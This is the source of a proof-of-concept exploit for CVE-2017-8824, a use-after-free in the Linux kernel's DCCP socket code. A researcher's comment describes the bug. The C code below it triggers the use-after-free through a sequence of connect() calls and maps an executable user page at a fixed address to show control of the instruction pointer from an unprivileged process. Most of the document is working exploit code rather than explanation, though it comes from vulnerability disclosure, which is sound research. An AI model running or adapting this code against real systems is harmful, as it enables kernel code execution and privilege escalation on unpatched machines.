/*
This is an announcement for CVE-2017-8824 which is a use-after-free
vulnerability

I found in Linux DCCP socket. It can be used to gain kernel code execution
from unprivileged processes.



You’ll find in attachment the proof of concept code and the kernel panic
log.



#######   BUG DETAILS  ############



When a socket sock object is in DCCP_LISTEN  state and connect() system
call is being called with AF_UNSPEC,

the dccp_disconnect() puts sock state into DCCP_CLOSED, and forgets to free
dccps_hc_rx_ccid/dccps_hc_tx_ccid and assigns NULL to them,

then when we call connect() again with AF_INET6 sockaddr family, the sock
object gets cloned via dccp_create_openreq_child() and returns a new sock
object,

which holds references of dccps_hc_rx_ccid and dccps_hc_tx_ccid of the old
sock object, and this leads to both the old and new sock objects can use
the same memory.



#######   LINKS  ############



http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-8824

http://lists.openwall.net/netdev/2017/12/04/224



#######   CREDITS  ############



Mohamed Ghannam
*/

/*This poc has been tested on my custom kernel reseach in ubuntu 4.10.5, the same thing applies to other versions
 * if you don't see RIP control, that means file_security_alloc is not called, so we should look for other similar object
 * */
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <netinet/in.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/mman.h>


int fd1,fd2;
struct sockaddr_in6 in1,in2;

int do_uaf()
{
    struct sockaddr_in6 cin1,cin2;

    fd1 = socket(0xa,6,0);

    memset(&in1,0,sizeof(in1));
    in1.sin6_family = AF_INET6;
    in1.sin6_addr = in6addr_loopback;
    in1.sin6_port = 0x214e;//htons(0x1000);
    bind(fd1,(struct sockaddr*)&in1,sizeof(in1));

    listen(fd1,0x1);

    fd2 = socket(0xa,6,0);

    memset(&cin1,0,sizeof(cin1));
    cin1.sin6_family = AF_INET6;
    cin1.sin6_addr = in6addr_loopback;
    cin1.sin6_port = 0x214e;//htons(0x1000);
    cin1.sin6_flowinfo = 0;
    connect(fd2,(struct sockaddr*)&cin1,sizeof(cin1));

    memset(&cin2,0,sizeof(cin2));
    connect(fd1,(struct sockaddr*)&cin2,sizeof(cin2));
    memset(&in2,0,sizeof(in2));

    in2.sin6_family = AF_INET6;
    in2.sin6_addr = in6addr_loopback;
    in2.sin6_port = htons(0x2000);
    in2.sin6_flowinfo = 0x2;
    in2.sin6_scope_id = 6;
    bind(fd2,(struct sockaddr*)&in2,sizeof(in2));

    struct sockaddr_in6 cin3;
    memset(&cin3,0,sizeof(cin3));
    connect(fd2,(struct sockaddr*)&cin3,sizeof(cin3));

    listen(fd2,0xb1);

    struct sockaddr_in6 cin4;
    memset(&cin4,0,sizeof(cin4));
    cin4.sin6_family = AF_INET6;
    cin4.sin6_port = htons(0x2000);//htons(0x3000);
    memset(&cin4.sin6_addr,0,sizeof(struct in6_addr));
    cin4.sin6_flowinfo = 1;
    cin4.sin6_scope_id = 0x32f1;
    connect(fd1,(struct sockaddr*)&cin4,sizeof(cin4));
    return fd2;
}

void * alloc_umem(void *addr,size_t size)
{

    addr = mmap((void*)0x100000000,4096,PROT_READ | PROT_WRITE | PROT_EXEC,MAP_SHARED|MAP_ANONYMOUS,-1,0);
    if(addr == (char *)-1) {
        perror("mmap");
        return NULL;
    }
    return addr;
}
int main(void)
{
    char *addr;

    addr = (char *)alloc_umem((void*)0x100000000,4096);
    if(addr == NULL)
        exit(0);
    memset(addr,0xcc,4096);
    *(unsigned long *)(addr + 0x79) = 0xdeadbeef; /* RIP control */

    do_uaf();
    socket(AF_INET,SOCK_STREAM,0);
    close(fd2);
    return 0;
}